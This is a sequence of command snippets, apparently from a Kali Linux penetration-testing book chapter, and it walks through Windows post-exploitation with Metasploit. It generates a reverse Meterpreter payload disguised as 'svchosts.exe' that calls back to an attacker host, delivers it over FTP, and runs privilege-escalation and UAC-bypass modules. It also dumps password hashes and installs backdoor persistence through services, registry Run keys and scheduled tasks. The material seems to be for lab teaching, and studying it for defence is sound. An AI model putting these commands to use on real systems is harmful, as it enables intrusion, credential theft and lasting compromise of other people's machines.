["```\n    MsfVenom - a Metasploit standalone payload generator.\n    Also a replacement for msfpayload and msfencode.\n    Usage: /usr/bin/msfvenom [options] <var=val>\n    Options:\n    -p, --payload  <payload> Payload to use. Specify a '-' or stdin to use custom payloads\n    --payload-options   List the payload's standard options\n    -l, --list   [type]  List a module type. Options are: payloads, encoders, nops, all\n    -n, --nopsled  <length>  Prepend a nopsled of [length] size on to the payload\n    -f, --format  <format>  Output format (use --help-formats for a list)\n    --help-formats    List available formats\n    -e, --encoder  <encoder> The encoder to use\n    -a, --arch   <arch>  The architecture to use\n    --platform  <platform> The platform of the payload\n    --help-platforms    List available platforms\n    -s, --space   <length>  The maximum size of the resulting payload\n    --encoder-space <length>  The maximum size of the encoded payload (defaults to the -s value)\n    -b, --bad-chars  <list>  The list of characters to avoid example: '\\x00\\xff'\n    -i, --iterations <count>  The number of times to encode the payload\n    -c, --add-code  <path>  Specify an additional win32 shellcode file to include\n    -x, --template  <path>  Specify a custom executable file to use as a template\n    -k, --keep      Preserve the template behavior and inject the payload as a new thread\n    -o, --out   <path>  Save the payload\n    -v, --var-name  <name>  Specify a custom variable name to use for certain output formats\n    --smallest     Generate the smallest possible payload\n    -h, --help      Show this message\n\n```", "```\nset SRVHOST 172.16.42.215\nset FTPROOT /var/ftproot\n```", "```\n    cp srvhosts.exe /var/ftproot/srvhosts.exe\n```", "```\nrdesktop 172.16.42.6  \n```", "```\nftp 172.16.42.215 \n```", "```\nGET svchosts.exe C:\\Windows\\temp\\svchosts.exe  \n```", "```\nuse exploit/multi/handler\nset LHOST 172.16.42.215 //(the attacking machine)\nset LPORT 443\nset PAYLOAD windows/meterpreter/reverse_https (sets the handler payload)\nshow options //(this will let you check the settings)\nrun -j //(the -j option will run the handler as a job in the background)  \n```", "```\njobs -k 1  \n```", "```\nC:\\Windows\\temp\\svchosts.exe\n```", "```\n    msf > info exploit/windows/local/ms16_032_secondary_logon_handle_privesc\n    Name: MS16-032 Secondary Logon Handle Privilege Escalation\n    Module: exploit/windows/local/ms16_032_secondary_logon_handle_privesc\n    Platform: Windows\n    Privileged: No\n    License: BSD License\n    Rank: Normal\n    Disclosed: 2016-03-21\n\n    Provided by:\n    James Forshaw\n    b33f\n    khr0x40sh\n\n    Available targets:\n    Id Name\n    -- ----\n    0 Windows x86\n    1 Windows x64\n\n    Basic options:\n    Name  Current Setting Required Description\n    ----  --------------- -------- -----------\n    SESSION     yes  The session to run this module on.\n\n    Payload information:\n\n    Description:\n    This module exploits the lack of sanitization of standard handles in \n    Windows' Secondary Logon Service. The vulnerability is known to \n    affect versions of Windows 7-10 and 2k8-2k12 32 and 64 bit. This \n    module will only work against those versions of Windows with \n    Powershell 2.0 or later and systems with two or more CPU cores.\n\n```", "```\nuse exploit/windows/local/ms16_032_secondary_logon_handle_privesc  \n```", "```\nset SESSION 2  \n```", "```\nuse exploit/windows/local/service_permissions  \n```", "```\n    msf > info exploit/windows/local/service_permissions\n\n    Name: Windows Escalate Service Permissions Local Privilege Escalation\n    Module: exploit/windows/local/service_permissions\n    Platform: Windows\n    Privileged: No\n    License: Metasploit Framework License (BSD)\n    Rank: Great\n    Disclosed: 2012-10-15\n\n    Provided by:\n    scriptjunkie\n\n    Available targets:\n    Id Name\n    -- ----\n    0 Automatic\n\n    Basic options:\n    Name  Current Setting Required Description\n    ----  --------------- -------- -----------\n    AGGRESSIVE false   no  Exploit as many services as possible (dangerous)\n    SESSION      yes  The session to run this module on.\n\n    Payload information:\n\n    Description:\n    This module attempts to exploit existing administrative privileges \n    to obtain a SYSTEM session. If directly creating a service fails, \n    this module will inspect existing services to look for insecure file \n    or configuration permissions that may be hijacked. It will then \n    attempt to restart the replaced service to run the payload. This \n    will result in a new session when this succeeds.\n\n```", "```\n    msf > info exploit/windows/local/bypassuac_vbs \n\n    Name: Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)\n    Module: exploit/windows/local/bypassuac_vbs\n    Platform: Windows\n    Privileged: No\n    License: Metasploit Framework License (BSD)\n    Rank: Excellent\n    Disclosed: 2015-08-22\n\n    Provided by:\n    Vozzie\n    Ben Campbell <eat_meatballs@hotmail.co.uk>\n\n    Available targets:\n    Id Name\n    -- ----\n    0 Automatic\n\n    Basic options:\n    Name  Current Setting Required Description\n    ----  --------------- -------- -----------\n    SESSION     yes  The session to run this module on.\n\n    Payload information:\n\n    Description:\n    This module will bypass Windows UAC by utilizing the missing \n    .manifest on the script host cscript/wscript.exe binaries.\n\n```", "```\nC:\\Windows\\Temp\\svchosts.exe  \n```", "```\nC:\\Windows\\Temp\\svchosts.exe  \n```", "```\n    msf post(smart_hashdump) > info\n\n    Name: Windows Gather Local and Domain Controller Account Password Hashes\n    Module: post/windows/gather/smart_hashdump\n    Platform: Windows\n    Arch: \n    Rank: Normal\n\n    Provided by:\n    Carlos Perez <carlos_perez@darkoperator.com>\n\n    Basic options:\n    Name  Current Setting Required Description\n    ----  --------------- -------- -----------\n    GETSYSTEM false   no  Attempt to get SYSTEM privilege on the target host.\n    SESSION      yes  The session to run this module on.\n\n    Description:\n    This will dump local accounts from the SAM Database. If the target \n    host is a Domain Controller, it will dump the Domain Account \n    Database using the proper technique depending on privilege level, OS \n    and role of the host.\n\n```", "```\nuse post/windows/manage/persistence_exe\n```", "```\n    msf post(persistence_exe) > info\n\n    Name: Windows Manage Persistent EXE Payload Installer\n    Module: post/windows/manage/persistence_exe\n    Platform: Windows\n    Arch: \n    Rank: Normal\n\n    Provided by:\n    Merlyn drforbin Cousins <drforbin6@gmail.com>\n\n    Basic options:\n    Name  Current Setting Required Description\n    ----  --------------- -------- -----------\n    REXENAME default.exe  yes  The name to call exe on remote system\n    REXEPATH     yes  The remote executable to use.\n    SESSION     yes  The session to run this module on.\n    STARTUP USER    yes  Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)\n\n    Description:\n    This Module will upload a executable to a remote host and make it \n    Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER \n    will start on user login, SYSTEM will start on system boot but \n    requires privs. SERVICE will create a new service that will start the payload. Again requires privs.\n\n```", "```\nset REXENAME svchosts.exe\nset REXEPATH /media/root/files/kali2016-2-book/chap8/svchosts.exe\nset SESSION 2\nset STARTUP SERVICE\nshow options\nexploit\n```", "```\nmsfvenom -p windows/meterpreter_reverse_tcp --platform windows -f exe -a x86 LHOST=172.16.42.215 LPORT=4444 -o svchosts2.exe\n\n```", "```\nuse post/windows/manage/persistence_exe\nset PAYLOAD windows/meterpreter_reverse_tcp\nset LPORT 4444\nrun -j\n```", "```\nuse post/windows/manage/persistence_exe  \n```", "```\nset REXEPATH /media/bo/files/kali2016-2-book/chap8/svchosts2.exe\nshow options # To check the settings then.\nExploit  \n```", "```\nset STARTUP USER\nshow options\nexploit  \n```", "```\nsessions -K # This kills all running sessions.\nrun -j # This restarts the handler.  \n```", "```\n    msf exploit(registry_persistence) > info\n\n    Name: Windows Registry Only Persistence\n    Module: exploit/windows/local/registry_persistence\n    Platform: Windows\n    Privileged: No\n    License: Metasploit Framework License (BSD)\n    Rank: Excellent\n    Disclosed: 2015-07-01\n\n    Provided by:\n    Donny Maasland <donny.maasland@fox-it.com>\n\n    Available targets:\n    Id Name\n    -- ----\n    0 Automatic\n\n    Basic options:\n    Name   Current Setting Required Description\n    ----   --------------- -------- -----------\n    BLOB_REG_KEY     no  The registry key to use for storing the payload blob. (Default: random)\n    BLOB_REG_NAME     no  The name to use for storing the payload blob. (Default: random)\n    CREATE_RC  true    no  Create a resource file for cleanup\n    RUN_NAME      no  The name to use for the 'Run' key. (Default: random)\n    SESSION       yes  The session to run this module on.\n    SLEEP_TIME  0    no  Amount of time to sleep (in seconds) before executing payload. (Default: 0)\n    STARTUP  USER    yes  Startup type for the persistent payload. (Accepted: USER, SYSTEM)\n\n    Payload information:\n\n    Description:\n    This module will install a payload that is executed during boot. It \n    will be executed either at user logon or system startup via the \n    registry value in \"CurrentVersion\\Run\" (depending on privilege and \n    selected method). The payload will be installed completely in \n    registry.\n\n```", "```\n    sessions -i 4 Interact with the running session.\n    run persistence -h To view the help files.\n\n    meterpreter > run persistence -h\n\n    [!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.\n    [!] Example: run post/windows/manage/persistence_exe OPTION=value [...]\n    Meterpreter Script for creating a persistent backdoor on a target host.\n\n    OPTIONS:\n\n    -A  Automatically start a matching exploit/multi/handler to connect to the agent\n    -L <opt> Location in target host to write payload to, if none %TEMP% will be used.\n    -P <opt> Payload to use, default is windows/meterpreter/reverse_tcp.\n    -S  Automatically start the agent on boot as a service (with SYSTEM privileges)\n    -T <opt> Alternate executable template to use\n    -U  Automatically start the agent when the User logs on\n    -X  Automatically start the agent when the system boots\n    -h  This help menu\n    -i <opt> The interval in seconds between each connection attempt\n    -p <opt> The port on which the system running Metasploit is listening\n    -r <opt> The IP of the system running Metasploit listening for the connect back  \n```", "```\nrun persistence -U -S -i 15 -p 4444 -r 172.16.42.215  \n```", "```\nShell  \n```", "```\ncopy C:\\Windows\\Temp\\server.exe C:\\Windows\\server.exe  \n```", "```\nnet start \"task scheduler\"\nat 23:30 /every:M,T,W,TH,F,SA,SU server.exe  \n```"]